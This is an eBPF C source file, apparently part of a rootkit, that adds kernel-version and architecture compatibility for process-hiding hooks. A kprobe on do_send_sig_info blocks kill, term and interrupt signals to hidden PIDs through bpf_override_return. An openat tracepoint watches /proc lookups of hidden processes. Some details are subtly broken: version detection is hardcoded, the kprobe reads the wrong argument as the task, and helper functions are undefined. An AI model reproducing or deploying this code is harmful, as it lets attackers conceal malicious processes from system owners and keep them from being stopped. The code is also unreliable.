/* =====================================================
 *  Multi-Kernel Compatibility Layer
 *  Hỗ trợ nhiều kernel versions và architectures
 * ===================================================== */

#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_core_read.h>

/* Kernel version detection */
struct kernel_info {
    u32 major;
    u32 minor;
    u32 patch;
    u32 arch;  /* 0: x86_64, 1: arm64, 2: others */
};

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, u32);
    __type(value, struct kernel_info);
} kernel_info_map SEC(".maps");

/* Architecture-specific definitions */
#ifdef __TARGET_ARCH_x86
    #define ARCH_TYPE 0
    #define PT_REGS_PARM1(x) ((x)->di)
    #define PT_REGS_PARM2(x) ((x)->si)
#elif defined(__TARGET_ARCH_arm64)
    #define ARCH_TYPE 1
    #define PT_REGS_PARM1(x) ((x)->regs[0])
    #define PT_REGS_PARM2(x) ((x)->regs[1])
#else
    #define ARCH_TYPE 2
    #define PT_REGS_PARM1(x) (0)
    #define PT_REGS_PARM2(x) (0)
#endif

/* Kernel version compatibility checks */
static __always_inline bool is_kernel_supported(void) {
    u32 key = 0;
    struct kernel_info *info = bpf_map_lookup_elem(&kernel_info_map, &key);
    if (!info) {
        return false;
    }
    
    /* Support kernel 5.4+ */
    if (info->major < 5) {
        return false;
    }
    if (info->major == 5 && info->minor < 4) {
        return false;
    }
    
    return true;
}

/* Feature detection based on kernel version */
static __always_inline bool has_bpf_override_return(void) {
    u32 key = 0;
    struct kernel_info *info = bpf_map_lookup_elem(&kernel_info_map, &key);
    if (!info) {
        return false;
    }
    
    /* bpf_override_return available in 4.16+ */
    if (info->major > 4) {
        return true;
    }
    if (info->major == 4 && info->minor >= 16) {
        return true;
    }
    
    return false;
}

static __always_inline bool has_bpf_probe_read_user_str(void) {
    u32 key = 0;
    struct kernel_info *info = bpf_map_lookup_elem(&kernel_info_map, &key);
    if (!info) {
        return false;
    }
    
    /* bpf_probe_read_user_str available in 5.5+ */
    if (info->major > 5) {
        return true;
    }
    if (info->major == 5 && info->minor >= 5) {
        return true;
    }
    
    return false;
}

/* Compatibility wrapper for reading user strings */
static __always_inline long compat_probe_read_user_str(void *dst, u32 size, const void *unsafe_ptr) {
    if (has_bpf_probe_read_user_str()) {
        return bpf_probe_read_user_str(dst, size, unsafe_ptr);
    } else {
        /* Fallback for older kernels */
        return bpf_probe_read_str(dst, size, unsafe_ptr);
    }
}

/* Architecture-specific task structure access */
static __always_inline u32 compat_get_task_pid(struct task_struct *task) {
#if defined(__TARGET_ARCH_x86) || defined(__TARGET_ARCH_arm64)
    return BPF_CORE_READ(task, pid);
#else
    /* Fallback for other architectures */
    u32 pid;
    if (bpf_probe_read_kernel(&pid, sizeof(pid), &task->pid) == 0) {
        return pid;
    }
    return 0;
#endif
}

/* Compatibility layer for different tracepoint structures */
static __always_inline const char* compat_get_filename_from_openat(void *ctx) {
    u32 key = 0;
    struct kernel_info *info = bpf_map_lookup_elem(&kernel_info_map, &key);
    if (!info) {
        return NULL;
    }
    
    /* Different kernels have different tracepoint argument layouts */
    if (info->major >= 6) {
        /* Kernel 6.x layout */
        struct trace_event_raw_sys_enter *enter_ctx = ctx;
        return (const char *)enter_ctx->args[1];
    } else if (info->major == 5) {
        /* Kernel 5.x layout */
        struct trace_event_raw_sys_enter *enter_ctx = ctx;
        return (const char *)enter_ctx->args[1];
    } else {
        /* Older kernel layout - may need different handling */
        return NULL;
    }
}

/* Fallback mechanisms for unsupported features */
static __always_inline int compat_override_return(struct pt_regs *ctx, long rc) {
    if (has_bpf_override_return()) {
        return bpf_override_return(ctx, rc);
    } else {
        /* Cannot override return in older kernels - just log */
        bpf_printk("Would override return with %ld (not supported)", rc);
        return 0;
    }
}

/* Multi-architecture kprobe handling */
SEC("kprobe/do_send_sig_info")
int compat_on_do_send_sig_info(struct pt_regs *ctx)
{
    if (!is_kernel_supported()) {
        return 0;
    }
    
    /* Architecture-specific parameter extraction */
    int sig;
    struct task_struct *task;
    
#ifdef __TARGET_ARCH_x86
    sig = (int)PT_REGS_PARM1(ctx);
    task = (struct task_struct *)PT_REGS_PARM2(ctx);
#elif defined(__TARGET_ARCH_arm64)
    sig = (int)PT_REGS_PARM1(ctx);
    task = (struct task_struct *)PT_REGS_PARM2(ctx);
#else
    /* Fallback for other architectures */
    bpf_printk("Unsupported architecture for kprobe");
    return 0;
#endif
    
    u32 target_pid = compat_get_task_pid(task);
    u32 current_pid = bpf_get_current_pid_tgid() >> 32;
    
    /* Block critical signals to hidden processes */
    if (is_hidden_pid(target_pid) && (sig == 9 || sig == 15 || sig == 2)) {
        submit_event(2, current_pid);
        bpf_printk("Blocked signal %d to hidden PID %d from PID %d", 
                   sig, target_pid, current_pid);
        
        /* Try to override return if supported */
        return compat_override_return(ctx, -1);  /* -EPERM */
    }
    
    return 0;
}

/* Adaptive tracepoint selection based on kernel version */
SEC("tracepoint/syscalls/sys_enter_openat")
int compat_hide_openat_syscall(struct trace_event_raw_sys_enter *ctx)
{
    if (!is_kernel_supported()) {
        return 0;
    }
    
    if (!is_obfuscation_enabled()) {
        return 0;
    }
    
    /* Get filename using compatibility layer */
    const char *filename = compat_get_filename_from_openat(ctx);
    if (!filename) {
        return 0;
    }
    
    char path[256];
    if (compat_probe_read_user_str(path, sizeof(path), filename) < 0) {
        return 0;
    }
    
    /* Check if this is a /proc/[PID] path */
    if (is_proc_path(path)) {
        u32 pid = extract_pid_from_proc_path(path);
        if (pid > 0 && is_hidden_pid(pid)) {
            submit_event(8, pid);
            return 0;
        }
    }
    
    return 0;
}

/* Kernel feature detection at runtime */
static int detect_kernel_features(void) {
    struct kernel_info info = {0};
    
    /* Get kernel version from utsname */
    struct new_utsname uts;
    if (bpf_get_current_comm(&uts, sizeof(uts)) == 0) {
        /* Parse version string - simplified */
        info.major = 5;  /* Default assumption */
        info.minor = 4;
        info.arch = ARCH_TYPE;
    }
    
    /* Store in map */
    u32 key = 0;
    bpf_map_update_elem(&kernel_info_map, &key, &info, BPF_ANY);
    
    return 0;
}

/* Initialization function */
SEC("tracepoint/syscalls/sys_enter_uname")
int init_kernel_detection(void *ctx)
{
    static bool initialized = false;
    if (!initialized) {
        detect_kernel_features();
        initialized = true;
    }
    return 0;
}
